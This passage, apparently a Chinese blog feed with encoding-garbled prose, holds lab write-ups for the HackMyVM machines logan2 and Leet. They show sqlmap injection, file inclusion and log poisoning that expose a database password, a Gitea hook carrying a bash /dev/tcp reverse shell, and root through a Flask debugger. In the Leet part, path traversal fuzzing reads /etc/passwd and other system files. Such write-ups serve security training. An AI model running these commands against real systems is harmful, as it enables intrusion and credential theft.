SF:ame=\'theme-color\'\x20content=\'#6cc644\'&gt;\n\t&lt;meta\x20name=\'author\'
SF:\x20content=\'Gitea\x20-\x20Git\x20with\x20a\x20cup\x20of\x20tea\'\x20/
SF:&gt;\n\t&lt;meta\x20name=\'description\'\x20content=\'Gitea\x20\(Git\x20with\
SF:x20a\x20c');
MAC Address: 08:00:27:B1:96:9A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.94 seconds

```

80„ÄÅ3000ÈÉΩÊòØhttpÊúçÂä°

# 2.Ë∏©ÁÇπ

80ÊòØÊ¨¢ËøéÈ°µÔºåÊúâ‰∏Ä‰∏™ËÑöÊú¨„ÄÇ3000ÊòØGiteaÈÄöÂ∏∏Ê≤°Ê¥ûÔºåÊâÄ‰ª•Êàë‰ª¨ÂÖàÁúãËÑöÊú¨

```bash
http://192.168.205.144/script.js

document.addEventListener('DOMContentLoaded', function() {
    fetch('/save-user-agent.php', {
        method: 'POST',
        body: JSON.stringify({ user_agent: navigator.userAgent }),
        headers: {
            'Content-Type': 'application/json'
        }
    })
    .then(response =&gt; {
        if (response.ok) {
            console.log('User-Agent saved successfully.');
        } else {
            console.error('Error saving User-Agent.');
        }
    })
    .catch(error =&gt; {
        console.error('Network error:', error);
    });
});

```

ÊÑèÊÄùÊòØÂÆÉuser_agentÂèØ‰ª•‰ª•json‰º†ÁÇπ‰∏úË•øÔºåÂºÄ‰∏™burpËØïËØï

![Image](https://github.com/user-attachments/assets/7eda310a-cb6a-4253-bcfc-7d775b7c4564)

sqlÊ≥®‰∏Ä‰∏ãÁúãÊúâÊ≤°Êúâ‰∏úË•ø

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/tmp]
‚îî‚îÄ$ sqlmap -r sql.txt --batch
        ___
       __H__                                                                                                                         
 ___ ___[,]_____ ___ ___  {1.9#stable}                                                                                                 
|_ -| . [,]     | .'| . |                                                                                                            
|___|_  [']_|_|_|__,|  _|                                                                                                            
      |_|V...       |_|   https://sqlmap.org                                                                                         

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 17:10:23 /2025-01-20/

[17:10:23] [INFO] parsing HTTP request from 'sql.txt'
JSON-like data found in GET body. Do you want to process it? [Y/n/q] Y
Cookie parameter '_csrf' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
[17:10:23] [INFO] testing connection to the target URL
[17:10:23] [INFO] testing if the target URL content is stable
[17:10:23] [ERROR] there was an error checking the stability of page because of lack of content. Please check the page request results (and probable errors) by using higher verbosity levels
[17:10:23] [INFO] testing if (custom) POST parameter 'JSON-like user_agent' is dynamic
[17:10:23] [WARNING] (custom) POST parameter 'JSON-like user_agent' does not appear to be dynamic
[17:10:23] [WARNING] heuristic (basic) test shows that (custom) POST parameter 'JSON-like user_agent' might not be injectable
[17:10:23] [INFO] testing for SQL injection on (custom) POST parameter 'JSON-like user_agent'
[17:10:24] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[17:10:24] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[17:10:24] [INFO] testing 'MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[17:10:24] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[17:10:24] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[17:10:24] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[17:10:24] [INFO] testing 'Generic inline queries'
[17:10:24] [INFO] testing 'PostgreSQL &gt; 8.1 stacked queries (comment)'
[17:10:24] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[17:10:24] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[17:10:24] [INFO] testing 'MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)'
[17:10:24] [INFO] testing 'PostgreSQL &gt; 8.1 AND time-based blind'
[17:10:24] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[17:10:24] [INFO] testing 'Oracle AND time-based blind'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[17:10:24] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[17:10:24] [WARNING] (custom) POST parameter 'JSON-like user_agent' does not seem to be injectable
[17:10:24] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'

[*] ending @ 17:10:24 /2025-01-20/


```

‰∏çË°åÔºåËá™Â∑±ÂÜô‰∏Ä‰∏™ËØïËØï

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/tmp]
‚îî‚îÄ$ sqlmap --url http://192.168.205.144/save-user-agent.php --method POST --data '{'user_agent':'1'}' --batch --current-db 
        ___
       __H__                                                                                                                         
 ___ ___[']_____ ___ ___  {1.9#stable}                                                                                               
|_ -| . [)]     | .'| . |                                                                                                            
|___|_  [(]_|_|_|__,|  _|                                                                                                            
      |_|V...       |_|   https://sqlmap.org                                                                                         

ÁúÅÁï•
[17:17:19] [INFO] adjusting time delay to 1 second due to good response times
logan
current database: 'logan'

‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/tmp]
‚îî‚îÄ$ sqlmap --url http://192.168.205.144/save-user-agent.php --method POST --data '{'user_agent':'1'}' --batch -D logan --tables     
        ___
       __H__                                                                                                                         
 ___ ___[(]_____ ___ ___  {1.9#stable}                                                                                                 
|_ -| . [(]     | .'| . |                                                                                                            
|___|_  [']_|_|_|__,|  _|                                                                                                            
      |_|V...       |_|   https://sqlmap.org                                                                                         

ÁúÅÁï•
[17:26:42] [INFO] adjusting time delay to 1 second due to good response times
3
[17:26:42] [INFO] retrieved: browser
[17:27:04] [INFO] retrieved: comments
[17:27:30] [INFO] retrieved: users
Database: logan
[3 tables]
+----------+
| browser  |
| comments |
| users    |
+----------+


‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/tmp]
‚îî‚îÄ$ sqlmap --url http://192.168.205.144/save-user-agent.php --method POST --data '{'user_agent':'1'}' --batch -D logan -T users --dump
        ___
       __H__                                                                                                                         
 ___ ___[.]_____ ___ ___  {1.9#stable}                                                                                                 
|_ -| . [)]     | .'| . |                                                                                                            
|___|_  [(]_|_|_|__,|  _|                                                                                                            
      |_|V...       |_|   https://sqlmap.org                                                                                         

ÁúÅÁï•
Database: logan
Table: users
[1 entry]
+------------------------------+--------+
| email                        | user   |
+------------------------------+--------+
| logan@newsitelogan.logan.hmv | logan  |
+------------------------------+--------+

```

Âè™Êúâ‰∏Ä‰∏™Áî®Êà∑ÂêçÂíåÂüüÂêçÔºåÊàë‰ª¨Â∞ÜÂüüÂêçÂä†‰∏ä

![Image](https://github.com/user-attachments/assets/6d62fde8-9b9e-47e5-8861-1658bae184b2)

ËØïËØïÊúâÊ≤°ÊúâÊñá‰ª∂ÂåÖÂê´

![Image](https://github.com/user-attachments/assets/9660a109-bcae-4ede-ba5f-2ccf553a07ea)

Â≠òÂú®Êñá‰ª∂ÂåÖÂê´ÔºåÂ∞ùËØïËØªÂèñÂØÜÈí•ÔºåÊó†Êûú„ÄÇÁúãÁúãÂ≠ò‰∏çÂ≠òÂú®Êó•ÂøóÊ≥®ÂÖ•

![Image](https://github.com/user-attachments/assets/3b1e466f-27cd-404c-a5cc-e812af4e6cee)

Â≠òÂú®ÔºåÂ∞ùËØïÊ≥®ÂÖ•

![Image](https://github.com/user-attachments/assets/c15708fd-3b31-4bc3-8778-6dc9da12fe2b)

ÂòªÂòª

![Image](https://github.com/user-attachments/assets/d6647484-800d-4bf2-98c7-09e15435ff1c)

‰∏çÂòªÂòªÔºåÂÆπÊòìÁöÑÈÉΩÁªôÂÆÉÁ¶Å‰∫Ü

![Image](https://github.com/user-attachments/assets/43e262e5-1441-4451-a648-11601dbdd8d7)

Ëøò‰∏ÄÂàÜÈíüÊ∏Ö‰∏ÄÊ¨°ÔºåËÄÉÈ™åÊâãÈÄüÊòØÂêßÔºü

![Image](https://github.com/user-attachments/assets/837e96ef-975c-44b9-a745-42b61d73363a)

![Image](https://github.com/user-attachments/assets/57f4d48e-140e-4f6a-a9da-87a65a12bccd)

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ echo 'PD9waHAKCQoJJHNlcnZlcm5hbWUgPSAibG9jYWxob3N0IjsKCSR1c2VybmFtZSA9ICJsb2dhbiI7CgkkcGFzc3dvcmQgPSAiU3VwZXJfbG9nYW4xMjM0IjsKCSRkYm5hbWUgPSAibG9nYW4iOwoKCS8vIENyZWF0ZSBjb25uZWN0aW9uCgkkY29ubiA9IG5ldyBteXNxbGkoJHNlcnZlcm5hbWUsICR1c2VybmFtZSwgJHBhc3N3b3JkLCAkZGJuYW1lKTsKCS8vIENoZWNrIGNvbm5lY3Rpb24KCWlmICgkY29ubi0+Y29ubmVjdF9lcnJvcikgewoJICBkaWUoIkNvbm5lY3Rpb24gZmFpbGVkOiAiIC4gJGNvbm4tPmNvbm5lY3RfZXJyb3IpOwoJfQoKPz4K' |base64 -d
&lt;?php

        $servername = 'localhost';
        $username = 'logan';
        $password = 'Super_logan1234';
        $dbname = 'logan';

        // Create connection
        $conn = new mysqli($servername, $username, $password, $dbname);
        // Check connection
        if ($conn-&gt;connect_error) {
          die('Connection failed: ' . $conn-&gt;connect_error);
        }

?&gt;

```

ÁôªÂΩïGitea

![Image](https://github.com/user-attachments/assets/87309749-0e27-4dc1-bf6a-09cb1b54d57c)

Êîπ‰∏™shell‰∏äÂéª

```bash
#!/bin/sh
bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.205.141/8888 0&gt;&amp;1'
ÁúÅÁï•
```

‰∫§‰∏™Êñá‰ª∂‰∏äÂéª

![Image](https://github.com/user-attachments/assets/e9aaf4dc-fb75-4f1c-98d5-583ffdd77f4a)

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.144] 55202
bash: cannot set terminal process group (428): Inappropriate ioctl for device
bash: no job control in this shell
git@logan2:~/gitea-repositories/logan/future_web.git$ id
id
uid=104(git) gid=113(git) groups=113(git)
```

# 3. Ëé∑ÂæóÁ®≥ÂÆöÁöÑ Shell

Ëé∑Âèñ**ÂèçÂêë shell** ÂêéÔºåÈÄöËøá‰ª•‰∏ãÂëΩ‰ª§Ëé∑ÂæóÁ®≥ÂÆöÁöÑ**‰∫§‰∫íÂºè** **TTY shell**Ôºö

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

# 4.ÊèêÊùÉ

```bash
git@logan2:~/gitea-repositories/logan/future_web.git$ sudo -l
Matching Defaults entries for git on logan2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User git may run the following commands on logan2:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/app.py
git@logan2:~/gitea-repositories/logan/future_web.git$ ls -la /opt/app.py
ls: cannot access '/opt/app.py': Permission denied
git@logan2:~/gitea-repositories/logan/future_web.git$ cd /home/
git@logan2:/home$ ls -al
total 20
drwxr-xr-x  5 root  root  4096 Sep 11  2023 .
drwxr-xr-x 18 root  root  4096 Aug 27  2023 ..
drwxr-xr-x  4 git   git   4096 Jan 20 02:58 git
drwx------  2 kevin kevin 4096 Sep 11  2023 kevin
drwx------  3 logan logan 4096 Sep 11  2023 logan
git@logan2:/home$ cd git/
git@logan2:~$ ls -al
total 20
drwxr-xr-x 4 git  git  4096 Jan 20 02:58 .
drwxr-xr-x 5 root root 4096 Sep 11  2023 ..
-rw-r--r-- 1 git  git   123 Jan 20 02:58 .gitconfig
drwx------ 2 git  git  4096 Aug 27  2023 .ssh
drwxr-xr-x 3 git  git  4096 Sep 11  2023 gitea-repositories
git@logan2:~$ cd /tmp/
git@logan2:/tmp$ ls -al
total 32
drwxrwxrwt  8 root root 4096 Jan 20 03:53 .
drwxr-xr-x 18 root root 4096 Aug 27  2023 ..
drwxrwxrwt  2 root root 4096 Jan 20 02:58 .ICE-unix
drwxrwxrwt  2 root root 4096 Jan 20 02:58 .X11-unix
drwxrwxrwt  2 root root 4096 Jan 20 02:58 .XIM-unix
drwxrwxrwt  2 root root 4096 Jan 20 02:58 .font-unix
drwx------  3 root root 4096 Jan 20 02:58 systemd-private-0d3aa9413d3b439bb9007bce25456a9d-apache2.service-ZTwD9s
drwx------  3 root root 4096 Jan 20 02:58 systemd-private-0d3aa9413d3b439bb9007bce25456a9d-systemd-logind.service-6lKqu3
git@logan2:/tmp$ cd /mnt/
git@logan2:/mnt$ ls -al
total 8
drwxr-xr-x  2 root root 4096 Aug 27  2023 .
drwxr-xr-x 18 root root 4096 Aug 27  2023 ..
git@logan2:/mnt$ cd /tmp/
git@logan2:/tmp$ find / -perm -4000 -type f 2&gt;/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/mount
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chfn
git@logan2:/tmp$ /sbin/getcap -r / 2&gt;/dev/null
/usr/bin/ping cap_net_raw=ep
git@logan2:/tmp$ ss -tuln | grep tcp
tcp   LISTEN 0      80         127.0.0.1:3306      0.0.0.0:*        
tcp   LISTEN 0      128          0.0.0.0:22        0.0.0.0:*        
tcp   LISTEN 0      128             [::]:22           [::]:*        
tcp   LISTEN 0      511                *:80              *:*        
tcp   LISTEN 0      4096               *:3000            *:*        
git@logan2:/tmp$ sudo -l
Matching Defaults entries for git on logan2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User git may run the following commands on logan2:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/app.py
git@logan2:/tmp$ sudo /usr/bin/python3 /opt/app.py
 * Serving Flask app 'app'
 * Debug mode: on
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://192.168.205.144:8000
Press CTRL+C to quit
 * Restarting with stat
 * Debugger is active!
 * Debugger PIN: 632-008-714

```

ÁÜüÊÇâÁöÑÈÖçÊñπÔºåÈÇ£Â∞±ÁÆÄÂçï‰∫ÜÔºàPINÈÉΩÁªô‰∫ÜDebugger PIN: 632-008-714Ôºâ

![Image](https://github.com/user-attachments/assets/ac3d324c-42a9-4b48-8e1a-999bb899c0e9)

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nc -lvnp 8889                                  
listening on [any] 8889 ...
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.144] 58630
root@logan2:/tmp# id
id
uid=0(root) gid=0(root) groups=0(root)

```sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_logan2.html</guid><pubDate>Fri, 27 Jun 2025 09:33:20 +0000</pubDate></item><item><title>hmv_LeetÁ¨îËÆ∞</title><link>https://7r1UMPHK.github.io/post/hmv_Leet-bi-ji.html</link><description># hmv_LeetÁ¨îËÆ∞

**Èù∂Êú∫**Ôºöhttps://hackmyvm.eu/machines/machine.php?vm=Leet

**ÈöæÂ∫¶**Ôºö&lt;span data-type='text' style='color: var(--b3-font-color8);'&gt;Á∫¢Ëâ≤&lt;/span&gt;

**ÁõÆÊ†á IP**Ôºö192.168.205.208
**Êú¨Êú∫ IP**Ôºö192.168.205.141

# 1.Á´ØÂè£Êûö‰∏æÂèäÊúçÂä°Êé¢Êµã

‰ΩøÁî® `nmap` Êâ´ÊèèÁõÆÊ†á IP ÁöÑÂºÄÊîæÁ´ØÂè£Ôºö

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nmap -sV -sT -O -Pn -n -p- 192.168.205.208
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-28 14:28 CST
Nmap scan report for 192.168.205.208
Host is up (0.00024s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
7777/tcp open  http    Werkzeug httpd 3.0.1 (Python 3.11.2)
MAC Address: 08:00:27:39:2C:58 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.17 seconds
```

7777 Á´ØÂè£ÊòØ Web ÊúçÂä°ËøòÊòØ python3.11.2 ÁöÑÔºåÂèØËÉΩÊòØÊÉ≥ËÄÉ SSTIÔºåÂéªÈ°µÈù¢ÁúãÁúº„ÄÇ

# 2.Ë∑ØÂæÑÂåÖÂê´

È°µÈù¢ÊòØ‰∏Ä‰∏™ L33T ConverterÔºàÈªëÂÆ¢ËØ≠Ë®ÄËΩ¨Êç¢Âô®Ôºâ

![image](https://github.com/user-attachments/assets/78a54a41-677f-4893-9236-ccbd513c99ad)

Âú®ËæìÂÖ•Ê°ÜÊµãËØï‰∫Ü xss,ssti,sql Ê≥®ÂÖ•Á≠âÈÉΩÊó†ÊûúÔºåÁÑ∂ÂêéÂèëÁé∞Ëøô‰∏™‰∏ãËΩΩË∂ÖÈìæÊé•Â∫îËØ•ÊúâÁÇπ‰∏úË•øÔºåË∞ÅÂÆ∂ËΩ¨Êç¢ÂÆåËøòÂèØ‰ª•‰∏ãËΩΩÂïä

![image](https://github.com/user-attachments/assets/014865fa-e61d-49de-ba77-da53c97db264)

ÁúãÁùÄÈÉΩÂÉè‰∏Ä‰∏™Ë∑ØÂæÑÂåÖÂê´ÔºåÊµãËØï‰∏Ä‰∏ã

![image](https://github.com/user-attachments/assets/dbda012f-0d89-4f5d-83ca-42601faaec8f)

ÁúãÁúãÊúâÂï•Áî®Êà∑

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ cat ~/Downloads/passwd|grep 'bash'
root:x:0:0:root:/root:/bin/bash
riva:x:1000:1000:,,,:/home/riva:/bin/bash
```

Â∞ùËØïËØªÂèñ `riva` Áî®Êà∑ÁöÑ ssh ÂØÜÈí•Ôºå‰∏çÁªôËØª

ÁàÜÁ†¥‰∏Ä‰∏ãÁõÆÂΩïÂåÖÂê´

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ wfuzz -c -u 'http://192.168.205.208:7777/download?filename=../../../../FUZZ' -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --hc=500,404 --hw=0
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.205.208:7777/download?filename=../../../../FUZZ
Total requests: 929

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                         
=====================================================================

000000023:   200        24 L     32 W       1217 Ch     '..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd'                        
000000020:   200        24 L     32 W       1217 Ch     '..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd' 
000000016:   200        24 L     32 W       1217 Ch     '/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2
                                                        e/etc/passwd'                                                   
000000135:   200        15 L     109 W      806 Ch      '/etc/fstab'                                                    
000000131:   200        22 L     190 W      1042 Ch     '/etc/crontab'                                                  
000000129:   200        18 L     105 W      1046 Ch     '/etc/apt/sources.list'                                         
000000121:   200        225 L    1107 W     7178 Ch     '/etc/apache2/apache2.conf'                                     
000000138:   200        53 L     53 W       683 Ch      '/etc/group'                                                    
000000209:   200        17 L     111 W      711 Ch      '/etc/hosts.deny'                                               
000000208:   200        10 L     57 W       411 Ch      '/etc/hosts.allow'                                              
000000206:   200        7 L      22 W       188 Ch      '../../../../../../../../../../../../etc/hosts'                 
000000205:   200        7 L      22 W       188 Ch      '/etc/hosts'                                                    
000000268:   200        24 L     32 W       1217 Ch     '../../../../../../../../../../../../etc/passwd'                
000000267:   200        24 L     32 W       1217 Ch     '../../../../../../../../../../../../../etc/passwd'             
000000266:   200        24 L     32 W       1217 Ch     '../../../../../../../../../../../../../../etc/passwd'          
000000265:   200        24 L     32 W       1217 Ch     '../../../../../../../../../../../../../../../etc/passwd'       
000000264:   200        24 L     32 W       1217 Ch     '../../../../../../../../../../../../../../../../etc/passwd'    
000000263:   200        24 L     32 W       1217 Ch     '../../../../../../../../../../../../../../../../../etc/passwd'   
000000262:   200        24 L     32 W       1217 Ch     '../../../../../../../../../../../../../../../../../../etc/passwd'  
000000261:   200        24 L     32 W       1217 Ch     '../../../../../../../../../../../../../../../../../../../etc/passwd' 
000000260:   200        24 L     32 W       1217 Ch     '../../../../../../../../../../../../../../../../../../../../etc/passw
                                                        d'                                                              
000000259:   200        24 L     32 W       1217 Ch     '../../../../../../../../../../../../../../../../../../../../../etc/pa
                                                        sswd'                                                           
000000258:   200        24 L     32 W       1217 Ch     '../../../../../../../../../../../../../../../../../../../../../../etc
                                                        /passwd'                                                        
000000257:   200        24 L     32 W       1217 Ch     '/etc/passwd'                                                   
000000254:   200        24 L     32 W       1217 Ch     '/../../../../../../../../../../etc/passwd'                     
000000253:   200        24 L     32 W       1217 Ch     '/./././././././././././etc/passwd'                             
000000250:   200        20 L     65 W       526 Ch      '/etc/nsswitch.conf'                                            
000000249:   200        19 L     103 W      767 Ch      '/etc/netconfig'                                                
000000246:   200        7 L      40 W       286 Ch      '/etc/motd'                                                     
000000237:   200        2 L      5 W        27 Ch       '/etc/issue'                                                    
000000236:   200        353 L    1042 W     8139 Ch     '/etc/init.d/apache2'                                           
000000269:   200        24 L     32 W       1217 Ch     '../../../../../../../../../../../etc/passwd'                   
000000271:   200        24 L     32 W       1217 Ch     '../../../../../../../../../etc/passwd'                         
000000275:   200        24 L     32 W       1217 Ch     '../../../../../etc/passwd'                                     
000000283:   200        24 L     32 W       1217 Ch     'etc/passwd'                                                    
000000311:   200        24 L     32 W       1217 Ch     '../../../../../../etc/passwd&amp;=%3C%3C%3C%3C'                    
000000279:   200        24 L     32 W       1217 Ch     '../etc/passwd'                                                 
000000278:   200        24 L     32 W       1217 Ch     '../../etc/passwd'                                              
000000277:   200        24 L     32 W       1217 Ch     '../../../etc/passwd'                                           
000000274:   200        24 L     32 W       1217 Ch     '../../../../../../etc/passwd'                                  
000000276:   200        24 L     32 W       1217 Ch     '../../../../etc/passwd'                                        
000000273:   200        24 L     32 W       1217 Ch     '../../../../../../../etc/passwd'                               
000000270:   200        24 L     32 W       1217 Ch     '../../../../../../../../../../etc/passwd'                      
000000272:   200        24 L     32 W       1217 Ch     '../../../../../../../../etc/passwd'                            
000000422:   200        122 L    387 W      3208 Ch     '/etc/ssh/sshd_config'                                          
000000400:   200        41 L     120 W      911 Ch      '/etc/rpc'                                                      
000000399:   200        3 L      6 W        63 Ch       '/etc/resolv.conf'                                              
000000699:   200        0 L      1 W        292 Ch      '/var/log/lastlog'                                              
000000750:   200        0 L      1 W        1149 Ch     '/var/run/utmp'                                                 
000000741:   200        21 L     154 W      100181 Ch   '/var/log/wtmp'                                                 
000000929:   200        24 L     32 W       1217 Ch     '///////../../../etc/passwd'                                    

Total time: 3.955495
Processed Requests: 929
Filtered Requests: 878
Requests/sec.: 234.8631
```

Âè´ GPT ÊÄªÁªì‰∫Ü‰∏Ä‰∏ãÁî®Â§Ñ

1. `/etc/passwd`ÔºöÂ≠òÂÇ®Á≥ªÁªüÁî®Êà∑Ë¥¶Êà∑‰ø°ÊÅØÁöÑÊñá‰ª∂ÔºåÂåÖÊã¨Áî®Êà∑Âêç„ÄÅÂØÜÁ†ÅÔºàÈÄöÂ∏∏ÊòØÂä†ÂØÜÁöÑÔºâ„ÄÅÁî®Êà∑ ID„ÄÅÁªÑ ID Á≠â„ÄÇ
2. `/etc/fstab`ÔºöÂ≠òÂÇ®Êñá‰ª∂Á≥ªÁªü‰ø°ÊÅØÁöÑÊñá‰ª∂ÔºåÁî®‰∫éÂú®Á≥ªÁªüÂêØÂä®Êó∂Ëá™Âä®ÊåÇËΩΩÊñá‰ª∂Á≥ªÁªü„ÄÇ
3. `/etc/crontab`ÔºöÂ≠òÂÇ® cron ‰Ωú‰∏öÁöÑÊñá‰ª∂ÔºåËøô‰∫õ‰Ωú‰∏öÊòØÂÆöÊó∂ÊâßË°åÁöÑ‰ªªÂä°„ÄÇ
4. `/etc/apt/sources.list`ÔºöDebian Á≥ª Linux ÂèëË°åÁâàÔºàÂ¶Ç UbuntuÔºâÁöÑËΩØ‰ª∂Ê∫êÂàóË°®Êñá‰ª∂ÔºåÁî®‰∫éÊåáÂÆöËΩØ‰ª∂ÂåÖÁÆ°ÁêÜÂô®ÔºàÂ¶Ç APTÔºâ‰ªéÂì™Èáå‰∏ãËΩΩËΩØ‰ª∂ÂåÖ„ÄÇ
5. `/etc/apache2/apache2.conf`ÔºöApache HTTP ÊúçÂä°Âô®ÁöÑ‰∏ªÈÖçÁΩÆÊñá‰ª∂„ÄÇ
6. `/etc/group`ÔºöÂ≠òÂÇ®Á≥ªÁªüÁªÑ‰ø°ÊÅØÁöÑÊñá‰ª∂ÔºåÂåÖÊã¨ÁªÑÂêçÂíåÁªÑÊàêÂëò„ÄÇ
7. `/etc/hosts.deny`ÔºöÁî®‰∫éÊåáÂÆö‰∏çÂÖÅËÆ∏ËÆøÈóÆÁ≥ªÁªüÁöÑ‰∏ªÊú∫ÂíåÊúçÂä°„ÄÇ
8. `/etc/hosts.allow`ÔºöÁî®‰∫éÊåáÂÆöÂÖÅËÆ∏ËÆøÈóÆÁ≥ªÁªüÁöÑ‰∏ªÊú∫ÂíåÊúçÂä°„ÄÇ
9. `/etc/hosts`ÔºöÂ≠òÂÇ®Êú¨Âú∞ DNS Ëß£ÊûêÁöÑÊñá‰ª∂ÔºåÁî®‰∫éÂ∞Ü‰∏ªÊú∫ÂêçÊò†Â∞ÑÂà∞ IP Âú∞ÂùÄ„ÄÇ
10. `/etc/nsswitch.conf`ÔºöÊéßÂà∂Á≥ªÁªüÂêçÁß∞ÊúçÂä°ÂàáÊç¢ÁöÑÈÖçÁΩÆÊñá‰ª∂„ÄÇ
11. `/etc/netconfig`ÔºöÁΩëÁªúÈÖçÁΩÆÊñá‰ª∂ÔºåÂåÖÂê´ÁΩëÁªúÊúçÂä°ÂíåÂçèËÆÆÁöÑÈÖçÁΩÆ‰ø°ÊÅØ„ÄÇ
12. `/etc/motd`ÔºöÁ≥ªÁªüÂêØÂä®Êó∂ÊòæÁ§∫ÁöÑÊ∂àÊÅØÔºåÈÄöÂ∏∏ÊòØÁ≥ªÁªü‰ø°ÊÅØÂíåÁâàÊùÉÂ£∞Êòé„ÄÇ
13. `/etc/issue`ÔºöÊòæÁ§∫Âú®ÁôªÂΩïÊèêÁ§∫Á¨¶‰πãÂâçÁöÑÁ≥ªÁªü‰ø°ÊÅØ„ÄÇ
14. `/etc/init.d/apache2`ÔºöApache HTTP ÊúçÂä°Âô®ÁöÑÂàùÂßãÂåñËÑöÊú¨ÔºåÁî®‰∫éÂêØÂä®ÂíåÂÅúÊ≠¢ÊúçÂä°„ÄÇ
15. `/etc/ssh/sshd_config`ÔºöSSH ÂÆàÊä§ËøõÁ®ãÁöÑÈÖçÁΩÆÊñá‰ª∂ÔºåÁî®‰∫éÊéßÂà∂ SSH ÊúçÂä°ÁöÑË°å‰∏∫„ÄÇ
16. `/etc/rpc`ÔºöÂ≠òÂÇ® RPC ÊúçÂä°‰ø°ÊÅØÁöÑÊñá‰ª∂„ÄÇ
17. `/etc/resolv.conf`ÔºöDNS Ëß£ÊûêÂô®ÈÖçÁΩÆÊñá‰ª∂ÔºåÊåáÂÆö DNS ÊúçÂä°Âô®Âú∞ÂùÄ„ÄÇ
18. `/var/log/lastlog`ÔºöÂ≠òÂÇ®Áî®Êà∑ÊúÄÂêéÁôªÂΩï‰ø°ÊÅØÁöÑÊó•ÂøóÊñá‰ª∂„ÄÇ
19. `/var/run/utmp`ÔºöÂ≠òÂÇ®ÂΩìÂâçÁôªÂΩïÁî®Êà∑‰ø°ÊÅØÁöÑÊñá‰ª∂„ÄÇ
20. `/var/log/wtmp`ÔºöÂ≠òÂÇ®Á≥ªÁªüÁôªÂΩïÂéÜÂè≤ËÆ∞ÂΩïÁöÑÊó•ÂøóÊñá‰ª∂„ÄÇ

```
